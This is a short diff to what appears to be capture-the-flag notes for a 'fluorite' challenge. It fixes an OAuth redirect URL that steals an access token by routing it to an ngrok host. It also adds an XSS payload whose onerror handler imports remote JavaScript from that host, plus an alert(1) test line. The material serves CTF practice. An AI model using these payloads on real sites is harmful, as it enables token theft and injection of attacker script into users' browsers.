@@ -43,7 +43,7 @@ document.location.hash.substr(1)
 ```
 
 ```
-https://auth.fluorite.ctfio.com/auth?client_id=1&redirect_url=https://fluorite.ctfio.com/redirect?url=https://e949-83-213-97-233.ngrok-free.app/test.html/&response_type=token
+https://auth.fluorite.ctfio.com/auth?client_id=1&redirect_url=https://fluorite.ctfio.com/redirect?url=https://e949-83-213-97-233.ngrok-free.app/test.html&response_type=token
 ```
 
 ```html
@@ -66,3 +66,10 @@ Hello World :-)
 
 # XSS
 
+```html
+"><img/src=x onerror=import("https://e949-83-213-97-233.ngrok-free.app/1.js")>
+```
+
+```js
+alert(1);//
+```
